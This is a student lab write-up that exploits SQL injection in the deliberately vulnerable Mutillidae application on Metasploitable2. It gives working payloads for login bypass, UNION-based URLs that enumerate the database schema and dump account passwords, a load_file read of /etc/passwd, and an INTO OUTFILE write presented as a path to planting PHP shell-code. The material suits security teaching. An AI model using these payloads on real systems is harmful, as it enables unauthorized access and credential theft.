# sqlinjection
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode

### Step 2:
Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. Identify IP address using ifconfig in Metasploitable2
![image](https://github.com/sakthipriyadhanusu/sqlinjection/assets/119393194/6036b2dc-a186-4eba-8556-dd9db79646ac)
Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.
![image](https://github.com/sakthipriyadhanusu/sqlinjection/assets/119393194/6ef23736-14df-4b75-9ed5-46a900b92c15)
Select Multidae from the menu listed as shown above. You will get the page as displayed below:
![image](https://github.com/sakthipriyadhanusu/sqlinjection/assets/119393194/dae089b1-b90c-4af9-ae0b-57fc5a3c14c5)
Click on the menu Login/Register and register for an account
![image](https://github.com/sakthipriyadhanusu/sqlinjection/assets/119393194/75781447-b173-45c4-bb94-894bc643e0b5)
Click on the link “Please register here” 
![image](https://github.com/sakthipriyadhanusu/sqlinjection/assets/119393194/e3367be8-b0b4-4200-8ee4-b322fd11d294)
Click on “Create Account” to display the following page: 
![image](https://github.com/sakthipriyadhanusu/sqlinjection/assets/119393194/7dd717bc-ecd6-46fc-b809-d23b952bbe9a)
The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;). For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.

![image](https://github.com/sakthipriyadhanusu/sqlinjection/assets/119393194/d68b1b58-ad36-478d-b11f-64e1ad8d619d)
Click “Login”. The logged in page will show as below: Screenshot 2023-06-10 223535
Bypassing login field
The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “ganesh.”

Now after logging out you will see the login page. In the login page give ganesh’ # . You can see the page now enters into the administrator page as before when giving the password.
![image](https://github.com/sakthipriyadhanusu/sqlinjection/assets/119393194/72465350-7c0c-4ec4-b99f-9c2e20e8dc1b)
Click the login button and you will see it enter into the administrator page.
![image](https://github.com/sakthipriyadhanusu/sqlinjection/assets/119393194/3c8dd4c2-ce81-4105-a98a-ef6b240a0797)
Union-based SQL injection
UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info”

After logging out, Now choose the menu as shown below:
![image](https://github.com/sakthipriyadhanusu/sqlinjection/assets/119393194/004ec65a-6395-4a14-afbd-97493f324d81)
![image](https://github.com/sakthipriyadhanusu/sqlinjection/assets/119393194/aa4c34fc-a7f3-45f5-ab49-ff45fb7e0722)
![image](https://github.com/sakthipriyadhanusu/sqlinjection/assets/119393194/75347051-b068-48bc-b2bc-4a38ee2401ff)
![image](https://github.com/sakthipriyadhanusu/sqlinjection/assets/119393194/0a8b164c-62cb-46f7-95c0-1900c70e2dc9)
![image](https://github.com/sakthipriyadhanusu/sqlinjection/assets/119393194/16065fa2-d156-4c76-9947-3caf70de1fa9)
From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.
![image](https://github.com/sakthipriyadhanusu/sqlinjection/assets/119393194/2eebfcd5-e58c-4f3f-89d6-7b7db129c069)
Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27order%20by%206%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/sakthipriyadhanusu/sqlinjection/assets/119393194/1a689314-8333-4d5c-8d7e-560dd158a41a)
After adding the order by 6 into the existing url , the following error statement will be obtained:
![image](https://github.com/sakthipriyadhanusu/sqlinjection/assets/119393194/adb907c0-bf27-470a-8c1b-cfb50c4df7a3)
When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.
![image](https://github.com/sakthipriyadhanusu/sqlinjection/assets/119393194/cd57c9e6-bc1b-4c96-bc3c-2cc72cbf0214)
As it is having 5 columns the query worked fine and it provides the correct result
![image](https://github.com/sakthipriyadhanusu/sqlinjection/assets/119393194/454f581d-9b54-4c4d-88e7-d20d605beb40)
Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5)
![image](https://github.com/sakthipriyadhanusu/sqlinjection/assets/119393194/c4a4e86e-9656-4c9a-9b9a-695db15352c1)
As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.
![image](https://github.com/sakthipriyadhanusu/sqlinjection/assets/119393194/82f26d54-e691-4cef-9a6a-1f6dd1ce253a)
Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details

Screenshot 2023-06-10 225314 The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5. In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one: union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,table_name,null,null,5%20from%20information_schema.tables%20where%20table_schema=%27owasp10%27%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/sakthipriyadhanusu/sqlinjection/assets/119393194/5239ce73-2f78-4b21-a5cc-49bd5ff4ab0f)
The url once executed will retrieve table names from the “owasp 10” database. ##Extracting sensitive data such as passwords

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.
![image](https://github.com/sakthipriyadhanusu/sqlinjection/assets/119393194/758ea820-6af5-4d8e-a63b-3d9f685fce9d)
The column names of the accounts is displayed below for the following url:

http://192.168.43.145/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/sakthipriyadhanusu/sqlinjection/assets/119393194/da7beb44-76fc-425e-b3ba-4f28dfd7e729)
Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/sakthipriyadhanusu/sqlinjection/assets/119393194/5eb02e50-fc89-4299-9b4d-bbec81a835eb)
Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.1.9/mutillidae/index.php?page=user-info.php&username=praveen%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
![image](https://github.com/sakthipriyadhanusu/sqlinjection/assets/119393194/ac799de1-1b3a-48c5-b8b5-95375fc73844)
the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server. Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).

## RESULT:
The SQL Injection vulnerability is successfully exploited using the Multidae web application in Metasploitable2.
